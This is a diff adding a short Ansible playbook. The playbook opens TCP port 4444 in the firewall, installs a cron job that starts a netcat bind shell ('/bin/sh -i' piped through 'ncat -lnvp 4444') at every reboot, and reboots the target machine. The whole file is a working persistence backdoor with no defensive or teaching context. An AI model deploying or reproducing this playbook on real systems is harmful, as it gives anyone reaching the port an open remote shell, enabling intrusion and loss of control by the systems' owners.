@@ -1,0 +1,23 @@
+---
+- hosts: "{{ host }}"
+  remote_user: "{{ user }}"
+
+  tasks:
+  - name: Allow TCP traffic on 4444
+    ansible.builtin.iptables:
+      chain: INPUT
+      protocol: "tcp"
+      destination_ports:
+        - "4444"
+      jump: ACCEPT
+
+  - name: Create netcat listener cron job
+    ansible.builtin.cron:
+      name: "Cron job executed after every reboot"
+      special_time: reboot
+      job: "while true; do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -lnvp 4444 >/tmp/f; done"
+      user: "{{ user }}"
+
+  - name: Reboot machine
+    ansible.builtin.reboot:
+      reboot_timeout: "60"
